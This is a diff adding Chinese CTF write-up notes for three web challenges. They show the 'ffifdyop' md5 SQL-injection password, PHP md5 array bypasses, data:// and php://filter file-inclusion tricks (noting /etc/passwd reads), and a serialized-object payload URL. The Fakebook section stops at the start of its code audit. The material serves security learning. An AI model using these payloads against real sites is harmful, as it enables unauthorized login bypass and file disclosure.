@@ -1313,3 +1313,274 @@ if (isset($_POST['password'])) {
 
 https://blog.csdn.net/weixin_44348894/article/details/105333137
 
+### [BJDCTF2020]Easy MD5
+
+进入网站
+
+![image-20210513105322411](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513105322411.png)
+
+抓包发现了个线索，一个SQL语句,这里可以确定是SQL注入了，但是和MD5编码相关
+
+![image-20210513105758984](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513105758984.png)
+
+
+
+~~~sql
+select * from 'admin' where password=md5($pass,true)
+~~~
+
+  **md5(string,raw\)**
+
+| 参数   | 描述                                                         |
+| ------ | ------------------------------------------------------------ |
+| string | 必需。要计算的字符串                                         |
+| raw    | 可选。 默认不写为FALSE，32位16进制的字符串；TRUE，16位原始二进制格式的字符串。 |
+
+
+
+**md5(string,true)函数在指定了true的时候，是返回的原始 16 字符二进制格式。  这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。**
+
+~~~php
+    content: ffifdyop
+    hex: 276f722736c95d99e921722cf9ed621c
+    raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
+    string: 'or'6]!r,b
+~~~
+
+ 这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是 `'` 字符。6f就是对应`  o  `。
+
+**这不是普通的二进制字符串，而是’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。这样的话就会和前面的形成闭合，构成万能密码。**
+
+~~~sql
+select * from 'admin' where password=''or'6.......'
+~~~
+
+这就是永真的了，这就是一个万能密码了相当于1’ or 1=1#或1’ or 1#。接下来就是找到这样子的字符串。而上面的字符串 `ffifdyop`就是其中一个payload，就可以直接用了
+
+但是我们思考一下为什么6\xc9]\x99\xe9!r,\xf9\xedb\x1c的布尔值是true呢？
+
+>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）
+
+我们输入这个ffifdyop字符串以后出现以下的页面：
+
+![image-20210513114017635](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513114017635.png)
+
+
+
+查看源码发现以下内容
+
+~~~php
+<!--
+$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b && md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+-->
+~~~
+
+代码的意思就是a，b两个参数要不相等，但是呢他们两个的MD5值需要相等。这里我想的是估计又是要利用PHP弱类型的缺陷绕过了。
+
+**md5()**
+
+```php
+$array1[] = array(
+ "foo" => "bar",
+ "bar" => "foo",
+);
+$array2 = array("foo", "bar", "hello", "world");
+var_dump(md5($array1)==md5($array2)); //true
+```
+
+PHP 手册中的 md5（）函数的描述是 `string md5 ( string $str [, bool $raw_output = false ] )`，`md5()` 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，`md5()` 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。
+
+以上内容是我在web篇总结的，正好用到此处，PHP内置函数的松散性，利用数组绕过。
+
+这个题的payload估计是传递两个数组参数，虽然传递的数组内容值不一样，但是两个数组的md5值也会相等
+
+成功到达下一步
+
+![image-20210513114738649](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513114738649.png)
+
+看这一步的代码是用post方法传递数值，绕过方式和上一步一样，得到flag值
+
+![image-20210513115227768](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513115227768.png)
+
+### [ZJCTF 2019]NiZhuanSiWei
+
+进入网站，出现了代码，开始代码审计吧
+
+~~~php
+ <?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+//
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?> 
+~~~
+
+**第一个绕过：**
+
+~~~php
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
+~~~
+
+​	这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话才能继续往下一步走，现在就剩下一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数读取文件。构造如下，
+
+~~~php
+text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
+~~~
+
+当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。data://text/plain,welcome to the zjctf
+
+**第二个绕过**
+
+~~~php
+$file = $_GET["file"];
+if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+~~~
+
+这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：
+
+~~~
+file=useless.php
+~~~
+
+所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。
+
+```php
+php://filter/read=convert.base64-encode/resource=useless.php
+```
+
+读到的useless.php内容如下：
+
+~~~php
+<?php  
+
+class Flag{  //flag.php  
+    public $file="flag.php";  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>  
+
+~~~
+
+**第三个绕过**
+
+~~~php
+$password = $_GET["password"];
+include($file);  //useless.php
+$password = unserialize($password);
+echo $password;
+~~~
+
+这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：
+
+```
+<?php  
+class Flag{  //flag.php  
+    public $file="flag.php";  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+$a = new Flag();
+echo serialize($a);
+?>
+//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+```
+
+最后payload
+
+~~~http
+http://738ae58a-c99d-45f0-87d0-f65b27ff87f8.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:%7Bs:4:"file";s:8:"flag.php";%7D
+~~~
+
+最终获得flag值
+
+![image-20210513150311612](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513150311612.png)
+
+### [网鼎杯 2018]Fakebook（*）
+
+![image-20210513151443501](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513151443501.png)
+
+试了一遍各个功能，没有发现什么异常，没有思路，看看别人的WP吧
+
+扫描目录发现了/robots.txt，打开发现了/user.php.bak，下载下来是PHP代码
+
+~~~php
+<?php
+class UserInfo
+{
+    public $name = "";
+    public $age = 0;
+    public $blog = "";
+    public function __construct($name, $age, $blog)
+    {
+        $this->name = $name;
+        $this->age = (int)$age;
+        $this->blog = $blog;
+    }
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+    public function getBlogContents ()
+    {
+        return $this->get($this->blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this->blog;
+        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
+    }
+}
+~~~
+
+开始代码审计
+
+https://www.freesion.com/article/4631470744/
+
